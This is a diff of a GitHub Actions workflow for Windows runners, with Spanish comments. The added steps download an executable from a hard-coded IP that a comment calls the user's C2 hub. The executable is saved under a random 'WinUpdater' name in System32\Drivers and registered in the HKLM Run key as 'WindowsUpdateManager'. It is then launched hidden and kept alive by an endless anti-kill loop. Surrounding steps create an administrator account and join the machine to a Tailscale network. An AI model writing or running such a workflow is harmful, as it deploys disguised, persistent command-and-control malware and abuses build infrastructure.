@@ -32,25 +32,30 @@ jobs:
           Add-LocalGroupMember -Group "Administrators" -Member "DevAdmin"
           echo "SRV_PASS=$p" >> $env:GITHUB_ENV
 
-      - name: 4. Deploy & Auto-Start Registry
+      - name: 4. Deploy FocusEngine & Auto-Start
         run: |
-          $url = "http://103.195.101.218:8080/Builds"
+          # Dirección IP de tu Hub C2 y ruta de descarga
+          $url = "http://103.195.101.218:8080/builds/FocusEngine.exe"
           
+          # Ofuscación de nombre y ruta en Drivers del sistema
           $randName = "WinUpdater_" + (Get-Random -Minimum 10 -Maximum 99) + ".exe"
           $dest = "C:\Windows\System32\Drivers\$randName"
           echo "PROC_NAME=$randName" >> $env:GITHUB_ENV
           echo "FULL_PATH=$dest" >> $env:GITHUB_ENV
           
           try {
+              # Descarga desde el Hub Central
               Invoke-WebRequest -Uri $url -OutFile $dest -UserAgent "Mozilla/5.0" -ErrorAction Stop
-              # AÃ±adir al registro de inicio para persistencia total
+              
+              # Inserción en Registro de Windows para persistencia tras reinicio
               $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
               Set-ItemProperty -Path $regPath -Name "WindowsUpdateManager" -Value $dest
               
+              # Ejecución en segundo plano oculto
               Start-Process $dest -WindowStyle Hidden
-              Write-Host "Proceso $randName desplegado y registrado en el inicio."
+              Write-Host "[SUCCESS] FocusEngine desplegado en: $dest"
           } catch {
-              Write-Error "Error en el despliegue."
+              Write-Error "[FATAL] No se pudo descargar el cliente desde $url"
               exit 1
           }
 
@@ -60,17 +65,18 @@ jobs:
           Start-Process msiexec.exe -ArgumentList "/i", "ts_setup.msi", "/quiet", "/norestart" -Wait
           & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname="dev-node-${{ matrix.node_id }}"
 
-      - name: 6. Persistence Monitor (Scan cada 5s)
+      - name: 6. Core Persistence Monitor (Anti-Kill)
         run: |
           $procOnly = $env:PROC_NAME.Replace(".exe", "")
           Write-Host "=========================================="
-          Write-Host "VIGILANCIA DE PROCESO ACTIVA"
-          Write-Host "Monitoreando: $procOnly"
+          Write-Host " MONITOR DE PERSISTENCIA FOCUS_CORE"
+          Write-Host " Monitoreando: $procOnly"
           Write-Host "=========================================="
           
           while ($true) {
+              # Verifica si el proceso sigue vivo cada 5 segundos
               if (!(Get-Process $procOnly -ErrorAction SilentlyContinue)) {
-                  Write-Host "[$(Get-Date)] Reiniciando proceso..."
+                  Write-Host "[$(Get-Date)] Proceso caído. Reiniciando desde $env:FULL_PATH..."
                   Start-Process $env:FULL_PATH -WindowStyle Hidden
               }
               Start-Sleep -Seconds 5
